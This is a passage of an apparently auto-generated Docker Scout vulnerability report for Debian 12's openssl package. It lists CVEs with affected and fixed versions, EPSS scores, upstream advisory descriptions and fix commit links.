<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: An invalid or NULL pointer dereference can happen in an application processing a malformed PKCS#12 file.  Impact summary: An application processing a malformed PKCS#12 file can be caused to dereference an invalid or NULL pointer on memory read, resulting in a Denial of Service.  A type confusion vulnerability exists in PKCS#12 parsing code where an ASN1_TYPE union member is accessed without first validating the type, causing an invalid pointer read.  The location is constrained to a 1-byte address space, meaning any attempted pointer manipulation can only target addresses between 0x00 and 0xFF. This range corresponds to the zero page, which is unmapped on most modern operating systems and will reliably result in a crash, leading only to a Denial of Service. Exploiting this issue also requires a user or application to process a maliciously crafted PKCS#12 file. It is uncommon to accept untrusted PKCS#12 files in applications as they are usually used to store private keys which are trusted by definition. For these reasons, the issue was assessed as Low severity.  The FIPS modules in 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the PKCS12 implementation is outside the OpenSSL FIPS module boundary.  OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue.  OpenSSL 1.0.2 is not affected by this issue.

---
- openssl 3.5.5-1
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/2502e7b7d4c0cf4f972a881641fe09edc67aeec4 (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/572844beca95068394c916626a6d3a490f831a49 (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-22796?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="medium : CVE--2026--22796" src="https://img.shields.io/badge/CVE--2026--22796-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.520%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A type confusion vulnerability exists in the signature verification of signed PKCS#7 data where an ASN1_TYPE union member is accessed without first validating the type, causing an invalid or NULL pointer dereference when processing malformed PKCS#7 data.  Impact summary: An application performing signature verification of PKCS#7 data or calling directly the PKCS7_digest_from_attributes() function can be caused to dereference an invalid or NULL pointer when reading, resulting in a Denial of Service.  The function PKCS7_digest_from_attributes() accesses the message digest attribute value without validating its type. When the type is not V_ASN1_OCTET_STRING, this results in accessing invalid memory through the ASN1_TYPE union, causing a crash.  Exploiting this vulnerability requires an attacker to provide a malformed signed PKCS#7 to an application that verifies it. The impact of the exploit is just a Denial of Service, the PKCS7 API is legacy and applications should be using the CMS API instead. For these reasons the issue was assessed as Low severity.  The FIPS modules in 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the PKCS#7 parsing implementation is outside the OpenSSL FIPS module boundary.  OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0, 1.1.1 and 1.0.2 are vulnerable to this issue.

---
- openssl 3.5.5-1
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/2502e7b7d4c0cf4f972a881641fe09edc67aeec4 (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/572844beca95068394c916626a6d3a490f831a49 (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-68160?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="medium : CVE--2025--68160" src="https://img.shields.io/badge/CVE--2025--68160-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Writing large, newline-free data into a BIO chain using the line-buffering filter where the next BIO performs short writes can trigger a heap-based out-of-bounds write.  Impact summary: This out-of-bounds write can cause memory corruption which typically results in a crash, leading to Denial of Service for an application.  The line-buffering BIO filter (BIO_f_linebuffer) is not used by default in TLS/SSL data paths. In OpenSSL command-line applications, it is typically only pushed onto stdout/stderr on VMS systems. Third-party applications that explicitly use this filter with a BIO chain that can short-write and that write large, newline-free data influenced by an attacker would be affected. However, the circumstances where this could happen are unlikely to be under attacker control, and BIO_f_linebuffer is unlikely to be handling non-curated data controlled by an attacker. For that reason the issue was assessed as Low severity.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the BIO implementation is outside the OpenSSL FIPS module boundary.  OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0, 1.1.1 and 1.0.2 are vulnerable to this issue.

---
- openssl 3.5.5-1
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/6845c3b6460a98b1ec4e463baa2ea1a63a32d7c0 (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/475c466ef2fbd8fc1df6fae1c3eed9c813fc8ff6 (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-9143?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.15-1%7Edeb12u1"><img alt="medium : CVE--2024--9143" src="https://img.shields.io/badge/CVE--2024--9143-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.15-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.15-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.883%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted explicit values for the field polynomial can lead to out-of-bounds memory reads or writes.  Impact summary: Out of bound memory writes can lead to an application crash or even a possibility of a remote code execution, however, in all the protocols involving Elliptic Curve Cryptography that we're aware of, either only "named curves" are supported, or, if explicit curve parameters are supported, they specify an X9.62 encoding of binary (GF(2^m)) curves that can't represent problematic input values. Thus the likelihood of existence of a vulnerable application is low.  In particular, the X9.62 encoding is used for ECC keys in X.509 certificates, so problematic inputs cannot occur in the context of processing X.509 certificates.  Any problematic use-cases would have to be using an "exotic" curve encoding.  The affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(), and various supporting BN_GF2m_*() functions.  Applications working with "exotic" explicit binary (GF(2^m)) curve parameters, that make it possible to represent invalid field polynomials with a zero constant term, via the above or similar APIs, may terminate abruptly as a result of reading or writing outside of array bounds.  Remote code execution cannot easily be ruled out.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.

---
[experimental] - openssl 3.4.0-1
- openssl 3.3.2-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1085378)
[bookworm] - openssl 3.0.15-1~deb12u1
https://openssl-library.org/news/secadv/20241016.txt
https://github.com/openssl/openssl/commit/c0d3e4d32d2805f49bec30547f225bc4d092e1f4 (openssl-3.3)
https://github.com/openssl/openssl/commit/72ae83ad214d2eef262461365a1975707f862712 (openssl-3.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-13176?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.16-1%7Edeb12u1"><img alt="medium : CVE--2024--13176" src="https://img.shields.io/badge/CVE--2024--13176-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.16-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.16-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.100%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A timing side-channel which could potentially allow recovering the private key exists in the ECDSA signature computation.  Impact summary: A timing side-channel in ECDSA signature computations could allow recovering the private key by an attacker. However, measuring the timing would require either local access to the signing application or a very fast network connection with low latency.  There is a timing signal of around 300 nanoseconds when the top word of the inverted ECDSA nonce value is zero. This can happen with significant probability only for some of the supported elliptic curves. In particular the NIST P-521 curve is affected. To be able to measure this leak, the attacker process must either be located in the same physical computer or must have a very fast network connection with low latency. For that reason the severity of this vulnerability is Low.  The FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.

---
- openssl 3.4.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1094027)
[bookworm] - openssl 3.0.16-1~deb12u1
- edk2 2025.02-9
[trixie] - edk2 2025.02-8+deb13u1
[bookworm] - edk2 <no-dsa> (Minor issue)
https://openssl-library.org/news/secadv/20250120.txt
https://github.com/openssl/openssl/commit/77c608f4c8857e63e98e66444e2e761c9627916f (openssl-3.4.1)
https://github.com/openssl/openssl/commit/392dcb336405a0c94486aa6655057f59fd3a0902 (openssl-3.3.3)
https://github.com/openssl/openssl/commit/4b1cb94a734a7d4ec363ac0a215a25c181e11f65 (openssl-3.2.4)
https://github.com/openssl/openssl/commit/2af62e74fb59bc469506bc37eb2990ea408d9467 (openssl-3.1.8)
https://github.com/openssl/openssl/commit/07272b05b04836a762b4baa874958af51d513844 (openssl-3.0.16)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69418?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="medium : CVE--2025--69418" src="https://img.shields.io/badge/CVE--2025--69418-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: When using the low-level OCB API directly with AES-NI or<br>other hardware-accelerated code paths, inputs whose length is not a multiple<br>of 16 bytes can leave the final partial block unencrypted and unauthenticated.<br><br>Impact summary: The trailing 1-15 bytes of a message may be exposed in<br>cleartext on encryption and are not covered by the authentication tag,<br>allowing an attacker to read or tamper with those bytes without detection.<br><br>The low-level OCB encrypt and decrypt routines in the hardware-accelerated<br>stream path process full 16-byte blocks but do not advance the input/output<br>pointers. The subsequent tail-handling code then operates on the original<br>base pointers, effectively reprocessing the beginning of the buffer while<br>leaving the actual trailing bytes unprocessed. The authentication checksum<br>also excludes the true tail bytes.<br><br>However, typical OpenSSL consumers using EVP are not affected because the<br>higher-level EVP and provider OCB implementations split inputs so that full<br>blocks and trailing partial blocks are processed in separate calls, avoiding<br>the problematic code path. Additionally, TLS does not use OCB ciphersuites.<br>The vulnerability only affects applications that call the low-level<br>CRYPTO_ocb128_encrypt() or CRYPTO_ocb128_decrypt() functions directly with<br>non-block-aligned lengths in a single call on hardware-accelerated builds.<br>For these reasons the issue was assessed as Low severity.<br><br>The FIPS modules in 3.6, 3.5, 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected<br>by this issue, as OCB mode is not a FIPS-approved algorithm.<br><br>OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue.<br><br>OpenSSL 1.0.2 is not affected by this issue.

---
- openssl 3.5.5-1
https://openssl-library.org/news/secadv/20260127.txt
Fixed by: https://github.com/openssl/openssl/commit/4016975d4469cd6b94927c607f7c511385f928d8 (openssl-3.5.5)
Fixed by: https://github.com/openssl/openssl/commit/52d23c86a54adab5ee9f80e48b242b52c4cc2347 (openssl-3.0.19)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-45446?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="low : CVE--2026--45446" src="https://img.shields.io/badge/CVE--2026--45446-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: The implementations of AES-SIV (RFC 5297) and AES-GCM-SIV (RFC 8452) mishandle the authentication of AAD (Additional Authenticated Data) with an empty ciphertext allowing a forgery of such messages.  Impact summary: An attacker can forge empty messages with arbitrary AAD to the victim's application using these ciphers.  AES-SIV (RFC 5297) and AES-GCM-SIV (RFC 8452) are nonce-misuse-resistant AEAD modes: they accept a key, nonce, optional AAD (bytes that are authenticated but not encrypted), and plaintext, and produces ciphertext plus a 16-byte tag. On decrypt, `EVP_DecryptFinal_ex()` is documented to return success only if the tag is verified succesfully.  In OpenSSL's provider implementation of these ciphers, the expected tag is computed only when decryption function is invoked with non-empty data. If the caller supplies AAD and then calls `EVP_DecryptFinal_ex()` without invocation of the ciphertext update, which can happen when the received ciphertext length is zero, the tag is never recalculated and still holds its all-zeros value.  When AES-GCM-SIV is used, an attacker who sends arbitrary AAD, empty ciphertext, and all-zeros tag passes authentication under any key they do not know, single-shot. When AES-SIV is used, for mounting the attack it's necessary for the application to reuse the decryption context without resetting the key.  AES-SIV is implemented since OpenSSL 3.0. AES-GCM-SIV is implemented since OpenSSL 3.2.  No protocols implemented in OpenSSL itself (TLS/CMS/PKCS7/HPKE/QUIC) support either AES-GCM-SIV or AES-SIV. To mount an attack, the applications must implement their own protocol and use the EVP interface. Also they must skip the ciphertext update when a message with an empty ciphertext arrives.  The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are not affected by this issue, as these algorithms are not FIPS approved and the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
[bullseye] - openssl <not-affected> (Vulnerable code not present)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/71e2a5d263518cf5866043bd60ee4994d59e53a3 (openssl-3.0.21)
AES-SIV is implemented since OpenSSL 3.0. AES-GCM-SIV is implemented since OpenSSL 3.2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-45445?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="low : CVE--2026--45445" src="https://img.shields.io/badge/CVE--2026--45445-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: When an application drives an AES-OCB context through the public EVP_Cipher() one-shot interface, the application-supplied initialisation vector (IV) is silently discarded.  Impact summary: Every message encrypted under the same key uses the same effective nonce regardless of the IV supplied by the caller, resulting in (key, nonce) reuse and loss of confidentiality.  If the same code path is used to compute the authentication tag, the tag depends only on the (key, IV) pair and not on the plaintext or ciphertext, allowing universal forgery of arbitrary ciphertext from a single captured message.  OpenSSL provides two ways to drive a cipher: the documented streaming interface (EVP_CipherUpdate / EVP_CipherFinal_ex) and a lower-level one-shot, EVP_Cipher(), whose documentation explicitly recommends against use by applications in favour of EVP_CipherUpdate() and EVP_CipherFinal_ex().  The OCB provider's streaming handler flushes the application-supplied IV into the OCB context before processing data; the one-shot handler did not.  Every call to EVP_Cipher() on an AES-OCB context therefore ran with the all-zero key-derived offset state left by cipher initialisation, regardless of the caller's IV.  If EVP_EncryptFinal_ex() is subsequently used to obtain the authentication tag, the deferred IV setup runs at that point and clears the running checksum that should have been accumulated over the plaintext.  The resulting tag is a function of (key, IV) only and verifies against any ciphertext produced under the same (key, IV) pair.  The OpenSSL SSL/TLS implementation is not affected: AES-OCB is not a TLS cipher suite, and libssl does not call EVP_Cipher() in any case. Applications that drive AES-OCB through the documented streaming AEAD API (EVP_CipherUpdate / EVP_CipherFinal_ex) are not affected.  Only applications that combine the AES-OCB cipher with the EVP_Cipher() one-shot API are vulnerable.  The FIPS modules in 4.0, 3.6, 3.5, 3.4 and 3.0 are not affected by this issue, as AES-OCB is outside the OpenSSL FIPS module boundary.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
[bullseye] - openssl <not-affected> (see below)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/323f0b6e7d530a4cb4336d50c88cb70f3ac2a451 (openssl-3.0.21)
OpenSSL 1.1.1 and 1.0.2 are not affected by this issue: in those
releases the IV is applied synchronously during cipher initialisation
and the AES-OCB one-shot rejects data submitted before the IV is set.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42770?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="low : CVE--2026--42770" src="https://img.shields.io/badge/CVE--2026--42770-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.008%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: When EVP_PKEY_derive_set_peer() is called with a DHX (X9.42) peer key, the peer key is not properly checked for the subgroup membership.  Impact summary: A malicious peer which presents an X9.42 key carrying the victim's p and g parameters, a forged q = r (a small prime factor of the cofactor (p−1)/q_local), and a public value Y of order r can recover the victim's private key after a small number of key exchange attempts.  When EVP_PKEY_derive_set_peer() is called with a DHX (X9.42) peer key, the subgroup membership check Y^q ≡ 1 (mod p) is performed using the peer's own q parameter, not the local key's q. The peer's domain parameters are then matched against the domain parameters of the private key, but the value of q is not compared.  A malicious peer who presents an X9.42 key carrying the victim's p, g, a forged q = r (a small prime factor of the cofactor), and a public value Y of order r passes all checks. The shared secret then takes only r distinct values, leaking priv mod r. Repeating for each small-prime factor of the cofactor and combining via CRT recovers the full private key (Lim–Lee / small-subgroup-confinement attack).  The realistic attack surface is narrow: principally CMP deployments with long-lived RA/CA DHX keys and bespoke enterprise or government applications using X9.42 DHX static keys with interactive protocols and therefore this issue was assigned Low severity.  The FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are affected by this issue.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
[bullseye] - openssl <not-affected> (Vulnerable code introduced later)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/7fbfde7677ed8808828bf00ff01c937ca04bdda2 (openssl-3.0.21)
Introduced with: https://github.com/openssl/openssl/commit/46eee7104d77f9d303e06a398febdc60fd014d33

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-34182?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.20-1%7Edeb12u2"><img alt="low : CVE--2026--34182" src="https://img.shields.io/badge/CVE--2026--34182-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.20-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.20-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.005%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue Summary: Cryptographic Message Services (CMS) processing fails to perform sufficient input validation on the cipher and tag length fields of AuthEnvelopedData containers, leading to various potential compromises.  Impact Summary: Attackers making use of these vulnerabilities may achieve key-equivalent functionality for a given CMS recipient and/or bypass integrity validation for a given message.  In one use case, an attacker may send a CMS message containing AuthEnvelopedData with the cipher specified as a non-AEAD cipher.  OpenSSL erroneously allows this selection, and attempts to decrypt and validate the message.  An on-path attacker who captures one legitimate AES-GCM AuthEnvelopedData addressed to the victim can re-emit it with the recipientInfos set left byte-for-byte intact, so the victim's private key still unwraps the genuine CEK (the content-encryption key), but with the inner OID rewritten to AES-256-OFB (Output Feedback Mode, an unauthenticated keystream mode) and with an attacker-chosen IV and ciphertext. The victim initializes AES-256-OFB under the real CEK, never consults the MAC field, and CMS_decrypt() returns success.  If the application under attack responds to the attacker with any indicator showing success or failure of the decryption effort, it is possible for the attacker to use this as an oracle to obtain key equivalent functionality for the CEK used for the chosen recipient of the message.  In another use case, an attacker can reduce the tag length of the chosen AEAD cipher for a given AuthEnvelopedData container to be a single byte long, allowing an attacker to brute force CMS decryption, producing an integrity bypass for applications that trust CMS_decrypt() to reject modified content.  The FIPS modules are not affected by this issue.

---
- openssl <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1139674)
[bullseye] - openssl <not-affected> (Vulnerable code introduced later)
https://openssl-library.org/news/secadv/20260609.txt
Fixed by: https://github.com/openssl/openssl/commit/03c1f4d45fb963aee7d5833390c507cd290182bc (openssl-3.0.21)
Fixed by: https://github.com/openssl/openssl/commit/f48adad79a21fed9bfc31ea3ef65bee810e12ddd (openssl-3.0.21)
Introduced with: https://github.com/openssl/openssl/commit/924663c36d47066d5307937da77fed7e872730c7

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-31790?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.19-1%7Edeb12u2"><img alt="low : CVE--2026--31790" src="https://img.shields.io/badge/CVE--2026--31790-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.19-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.19-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Applications using RSASVE key encapsulation to establish a secret encryption key can send contents of an uninitialized memory buffer to a malicious peer.  Impact summary: The uninitialized buffer might contain sensitive data from the previous execution of the application process which leads to sensitive data leakage to an attacker.  RSA_public_encrypt() returns the number of bytes written on success and -1 on error. The affected code tests only whether the return value is non-zero. As a result, if RSA encryption fails, encapsulation can still return success to the caller, set the output lengths, and leave the caller to use the contents of the ciphertext buffer as if a valid KEM ciphertext had been produced.  If applications use EVP_PKEY_encapsulate() with RSA/RSASVE on an attacker-supplied invalid RSA public key without first validating that key, then this may cause stale or uninitialized contents of the caller-provided ciphertext buffer to be disclosed to the attacker in place of the KEM ciphertext.  As a workaround calling EVP_PKEY_public_check() or EVP_PKEY_public_check_quick() before EVP_PKEY_encapsulate() will mitigate the issue.  The FIPS modules in 3.6, 3.5, 3.4, 3.3, 3.1 and 3.0 are affected by this issue.

---
- openssl 3.6.2-1
[bullseye] - openssl <not-affected> (Only affects OpenSSL 3.x, RSASVE not present in 1.1.1)
https://openssl-library.org/news/secadv/20260407.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-31789?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.19-1%7Edeb12u2"><img alt="low : CVE--2026--31789" src="https://img.shields.io/badge/CVE--2026--31789-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.19-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.19-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Converting an excessively large OCTET STRING value to a hexadecimal string leads to a heap buffer overflow on 32 bit platforms.  Impact summary: A heap buffer overflow may lead to a crash or possibly an attacker controlled code execution or other undefined behavior.  If an attacker can supply a crafted X.509 certificate with an excessively large OCTET STRING value in extensions such as the Subject Key Identifier (SKID) or Authority Key Identifier (AKID) which are being converted to hex, the size of the buffer needed for the result is calculated as multiplication of the input length by 3. On 32 bit platforms, this multiplication may overflow resulting in the allocation of a smaller buffer and a heap buffer overflow.  Applications and services that print or log contents of untrusted X.509 certificates are vulnerable to this issue. As the certificates would have to have sizes of over 1 Gigabyte, printing or logging such certificates is a fairly unlikely operation and only 32 bit platforms are affected, this issue was assigned Low severity.  The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the affected code is outside the OpenSSL FIPS module boundary.

---
- openssl 3.6.2-1
[bullseye] - openssl <not-affected> (Vulnerable code introduced later)
https://openssl-library.org/news/secadv/20260407.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9232?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.17-1%7Edeb12u3"><img alt="low : CVE--2025--9232" src="https://img.shields.io/badge/CVE--2025--9232-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.17-1~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.17-1~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.069%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: An application using the OpenSSL HTTP client API functions may trigger an out-of-bounds read if the 'no_proxy' environment variable is set and the host portion of the authority component of the HTTP URL is an IPv6 address.  Impact summary: An out-of-bounds read can trigger a crash which leads to Denial of Service for an application.  The OpenSSL HTTP client API functions can be used directly by applications but they are also used by the OCSP client functions and CMP (Certificate Management Protocol) client implementation in OpenSSL. However the URLs used by these implementations are unlikely to be controlled by an attacker.  In this vulnerable code the out of bounds read can only trigger a crash. Furthermore the vulnerability requires an attacker-controlled URL to be passed from an application to the OpenSSL function and the user has to have a 'no_proxy' environment variable set. For the aforementioned reasons the issue was assessed as Low severity.  The vulnerable code was introduced in the following patch releases: 3.0.16, 3.1.8, 3.2.4, 3.3.3, 3.4.0 and 3.5.0.  The FIPS modules in 3.5, 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue, as the HTTP client implementation is outside the OpenSSL FIPS module boundary.

---
- openssl 3.5.4-1
[bullseye] - openssl <not-affected> (Vulnerable code not present)
https://openssl-library.org/news/secadv/20250930.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-27587?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2025--27587" src="https://img.shields.io/badge/CVE--2025--27587-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.224%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSL 3.0.0 through 3.3.2 on the PowerPC architecture is vulnerable to a Minerva attack, exploitable by measuring the time of signing of random messages using the EVP_DigestSign API, and then using the private key to extract the K value (nonce) from the signatures. Next, based on the bit size of the extracted nonce, one can compare the signing time of full-sized nonces to signatures that used smaller nonces, via statistical tests. There is a side-channel in the P-364 curve that allows private key extraction (also, there is a dependency between the bit size of K and the size of the side channel). NOTE: This CVE is disputed because the OpenSSL security policy explicitly notes that any side channels which require same physical system to be detected are outside of the threat model for the software. The timing signal is so small that it is infeasible to be detected without having the attacking process running on the same physical system.

---
- openssl 3.5.0-1 (unimportant)
https://github.com/openssl/openssl/issues/24253
https://github.com/openssl/openssl/commit/85cabd94958303859b1551364a609d4ff40b67a5 (master)
https://github.com/openssl/openssl/commit/080c6be0b102934bf66daeac70f0863f209f8d0f (openssl-3.5.0-beta1)
https://github.com/openssl/openssl/issues/24253#issuecomment-2144391562
Not considered a vulnerability by OpenSSL upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15467?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.18-1%7Edeb12u2"><img alt="low : CVE--2025--15467" src="https://img.shields.io/badge/CVE--2025--15467-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.18-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.18-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>2.889%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>87th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

